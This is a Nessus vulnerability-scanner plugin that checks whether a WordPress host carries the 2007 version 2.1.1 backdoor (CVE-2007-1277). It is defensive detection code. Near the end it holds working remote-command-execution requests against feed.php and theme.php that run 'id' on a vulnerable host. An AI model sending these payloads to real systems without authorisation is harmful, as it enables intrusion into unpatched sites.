#
# Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(24759);
  script_version("$Revision: 1.16 $");
  script_cvs_date("$Date: 2016/05/09 15:53:04 $");

  script_cve_id("CVE-2007-1277");
  script_bugtraq_id(22797);
  script_osvdb_id(33908, 33909);

  script_name(english:"WordPress < 2.1.1 Multiple Script Backdoors");
  script_summary(english:"Attempts to execute a command via a backdoor in WordPress.");

  script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP application that is affected by a
remote command execution vulnerability.");
  script_set_attribute(attribute:"description", value:
"The version of WordPress installed on the remote host appears to
include a backdoor that allows an unauthenticated, remote attacker to
execute arbitrary code on the remote host, subject to the permissions
of the web server user id.");
  # http://ifsec.blogspot.com/2007/03/wordpress-code-compromised-to-enable.html
  script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?22d131ef");
  script_set_attribute(attribute:"see_also", value:"http://www.securityfocus.com/archive/1/461794/30/0/threaded");
  script_set_attribute(attribute:"see_also", value:"http://wordpress.org/development/2007/03/upgrade-212/");
  script_set_attribute(attribute:"solution", value:
"Upgrade to WordPress version 2.1.2 or later and overwrite all the old
files, especially those in wp-includes. Also, examine your web logs
for suspicious activity and take appropriate steps if it appears that
it has been compromised.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_set_cvss_temporal_vector("CVSS2#E:ND/RL:OF/RC:C");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
  script_cwe_id(20);

  script_set_attribute(attribute:"vuln_publication_date", value:"2007/03/02");
  script_set_attribute(attribute:"patch_publication_date", value:"2007/03/02");
  script_set_attribute(attribute:"plugin_publication_date", value:"2007/03/02");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:wordpress:wordpress");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2007-2016 Tenable Network Security, Inc.");

  script_dependencies("wordpress_detect.nasl");
  script_require_keys("installed_sw/WordPress", "www/PHP");
  script_require_ports("Services/www", 80);

  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("install_func.inc");

app = "WordPress";
get_install_count(app_name:app, exit_if_zero:TRUE);

port = get_http_port(default:80, php:TRUE);

install = get_single_install(
  app_name : app,
  port     : port
);

dir = install['path'];
install_url = build_url(port:port, qs:dir);

http_check_remote_code(
  unique_dir:dir,
  check_request:"/wp-includes/feed.php?ix=system(id);",
  check_result:"uid=[0-9]+.*gid=[0-9]+.*",
  command:"id",
  port:port
);
if (thorough_tests)
{
  http_check_remote_code(
    unique_dir:dir,
    check_request:"/wp-includes/theme.php?iz=id",
    check_result:"uid=[0-9]+.*gid=[0-9]+.*",
    command:"id",
    port:port
  );
}
audit(AUDIT_WEB_APP_NOT_AFFECTED, app, install_url);
